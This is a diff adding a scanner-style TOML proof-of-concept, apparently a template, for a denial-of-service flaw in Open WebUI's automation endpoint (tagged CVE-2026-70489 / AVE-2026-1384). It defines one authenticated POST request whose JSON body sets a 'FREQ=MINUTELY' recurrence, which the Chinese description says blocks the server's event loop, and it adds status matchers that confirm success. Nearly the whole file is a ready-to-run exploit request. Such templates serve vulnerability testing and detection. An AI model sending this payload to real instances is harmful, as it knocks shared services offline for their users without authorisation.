@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "通过构造 FREQ=MINUTELY 的自动化循环规则，触发服务器端同步枚举大量时间间隔，导致事件循环阻塞引起实例级拒绝服务。"
+id = "POC-AVE-2026-1384"
+name = "Open WebUI Automation Recurrence DoS PoC"
+severity = "medium"
+tags = ["ave-2026-1384"]
+vuln_id = [
+    "CVE-2026-70489",
+    "AVE-2026-1384",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/v1/automations/"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+{
+  "name": "DoS Test",
+  "trigger": "on_message",
+  "recurrence": "FREQ=MINUTELY",
+  "action": "print('test')"
+}
+"""
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+]
+type = "status"
